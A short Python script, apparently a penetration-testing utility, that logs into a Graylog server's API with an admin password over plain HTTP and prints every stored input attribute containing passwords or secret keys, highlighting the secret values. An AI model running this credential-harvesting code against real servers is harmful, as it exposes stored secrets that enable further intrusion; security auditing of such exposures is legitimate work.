#!/usr/bin/env python3

# Graylog Obtain Credentials from Inputs

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
import getpass
import json
import logging
import requests
import urllib3
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style

colorama.init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%% Functions %%%%%%%%%#

def obtain_inputs(graylogip):

	inputsurl = "http://" + graylogip + ":9000/api/system/inputs?pretty=true"
	graylogpass = getpass.getpass(
		Fore.CYAN + Style.BRIGHT + "[!] Enter Graylog Admin Password: " + Style.RESET_ALL)

	try:
		response = requests.get(inputsurl, auth = HTTPBasicAuth('admin', graylogpass))

		if response.status_code == 200 and "DOCTYPE html" not in response.text:

			print(SEPARATOR)
			print("[!] Graylog Inputs with Secret Keys or Passwords")
			data = response.json()
			inputs = data['inputs']

			for x in inputs:
				attributes = x['attributes']

				if 'password' in str(attributes) or 'secret' in str(attributes):
					print(SEPARATOR)
					print("[!] " + str(x['title']))
					print(SEPARATOR)
					for y in attributes:
						if 'password' in str(y) or 'secret' in str(y):
							print(Fore.RED + Style.BRIGHT + "[!] " + str(y) + ": " + str(
								attributes[y]) + Style.RESET_ALL)
						else:
							print("[!] " + str(y) + ": " + str(attributes[y]))
			print(SEPARATOR)

		else:
			print(SEPARATOR)
			print("[!] Error obtaining Graylog Inputs")

	except Exception as e:
		logging.error(e, exc_info = True)

# %%%%%%%%%% The End %%%%%%%%%%#
